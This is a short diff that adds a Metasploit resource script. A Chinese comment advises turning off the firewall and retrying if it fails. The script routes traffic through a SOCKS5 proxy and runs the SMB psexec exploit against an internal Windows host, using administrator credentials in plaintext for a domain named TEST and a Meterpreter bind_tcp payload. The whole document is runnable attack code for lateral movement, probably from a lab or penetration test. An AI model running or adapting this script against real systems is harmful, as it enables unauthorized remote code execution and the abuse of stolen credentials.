@@ -1,0 +1,10 @@
+# 如果失败 关闭防火墙再试
+setg Proxies socks5:192.168.50.161:2080
+# set proxies socks5:1.1.1.1:1888
+use exploit/windows/smb/psexec
+set SMBDomain TEST
+set SMBUser administrator
+set SMBPass zxcASDqw123!!
+set payload windows/meterpreter/bind_tcp
+set rhosts 192.168.93.10
+run
